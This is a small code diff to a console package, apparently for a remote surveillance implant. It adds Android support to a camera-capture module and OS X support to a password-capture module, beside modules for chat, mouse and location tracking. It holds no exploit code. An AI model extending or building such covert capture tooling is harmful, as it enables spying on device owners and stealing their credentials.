@@ -50,7 +50,7 @@ package it.ht.rcs.console
 
 					record: true, _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
 
-				{module: "camera", quality: "med", _type: "desktop,mobile", _platform: "windows,osx,ios,winmo,symbian,linux"},
+				{module: "camera", quality: "med", _type: "desktop,mobile", _platform: "windows,osx,ios,winmo,symbian,linux,android"},
 
 				{module: "chat", _type: "desktop,mobile", _platform: "windows,osx,blackberry,linux,ios,android"},
 
@@ -80,7 +80,7 @@ package it.ht.rcs.console
 
 				{module: "mouse", width: 50, height: 50, _type: "desktop", _platform: "windows,osx,linux"},
 
-				{module: "password", _type: "desktop,mobile", _platform: "windows,symbian,linux,android"},
+				{module: "password", _type: "desktop,mobile", _platform: "windows,symbian,linux,android,osx"},
 
 				{module: "position", gps: false, cell: true, wifi: true, _type: "desktop,mobile", _platform: "windows,osx,blackberry,winmo,symbian,android,ios,linux,winphone"},
 
